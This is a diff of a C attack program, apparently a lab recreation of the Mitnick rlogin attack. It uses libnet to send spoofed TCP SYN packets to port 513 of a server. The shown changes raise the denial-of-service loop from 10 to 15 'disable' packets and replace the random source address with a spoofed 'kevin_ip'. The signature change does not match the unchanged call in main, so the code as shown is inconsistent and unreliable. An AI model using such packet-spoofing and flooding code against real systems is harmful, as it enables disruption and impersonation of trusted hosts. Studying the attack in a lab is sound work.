@@ -21,16 +21,16 @@ char * SERVER_IP = "172.16.16.3";
 #define PAYLOAD_RST "enable"
 
 //function definitions
-int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip);
+int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip);
 
 //shimomura you're doomed
 int main (void)
 {
 	//initialize libnett stuff
-	char e_buff[LIBNET_ERRBUF_SIZE];
+	char errbuff[LIBNET_ERRBUF_SIZE];
 	libnet_t * l;
 
-	l = libnet_init(LIBNET_RAW4, "eth0", e_buff);
+	l = libnet_init(LIBNET_RAW4, "eth0", errbuff);
 	if (l == NULL)
 	{
 		printf("libnet init error\n");
@@ -58,10 +58,11 @@ int main (void)
 	char disable[] = "disable";
 	int i;
 	printf("Starting the DOS attack\n");
-	for (i = 0; i < 10; i++)
+	for (i = 0; i < 15; i++)
 	{
 		//craft and send 10 packets with "disable" payload
-		send_syn(513, (uint8_t *) disable, 8, l, server_ip);
+		printf("dos\n");
+		send_syn(513, (uint8_t *) disable, (u_short) strlen(disable), l, server_ip);
 	}
 	//now the server will ignore syn acks, that's exactly what I need because
 
@@ -80,7 +81,7 @@ int main (void)
 }
 
 
-int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip)
+int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip)
 {
 
 	libnet_ptag_t t;
@@ -91,9 +92,9 @@ int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t 
 		libnet_get_prand(LIBNET_PRu32), //sequence number
     0, 															//ack number, can I send whatever?
     TH_SYN,													//control bit SYN
-		libnet_get_prand(LIBNET_PRu16), //window size, random is ok?
+		2048, 													//window size, random is ok?
 		0,															//checksum, if 0 libnet autofills
-		0,															//urgent pointer
+		10,															//urgent pointer
 		LIBNET_TCP_H + payload_s,				//len = tcp header + payload size
 		payload,												//payload
 		payload_s,											//payload size
@@ -107,6 +108,7 @@ int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t 
 		exit(EXIT_FAILURE);
 	}
 
+
 	//build ip fragment containing syn
 	t = libnet_build_ipv4(
 		LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, //size of the ip packet ,
@@ -116,7 +118,7 @@ int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t 
 		libnet_get_prand(LIBNET_PR8),							//ttl
     IPPROTO_TCP,															//upper protocol
     0,																				//checksum, 0 to autofill
-    libnet_get_prand(LIBNET_PRu32),						//src, I use a random fake ip
+    kevin_ip,																	//src, I use a random fake ip
     server_ip,																//destination
     NULL,																			//payload
     0,																				//payload len
@@ -136,6 +138,10 @@ int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t 
 	{
 		printf("error while sending packet\n");
 		exit(EXIT_FAILURE);
+	}
+	else
+	{
+		printf("sent %d\n", success);
 	}
 
 	libnet_clear_packet(l);
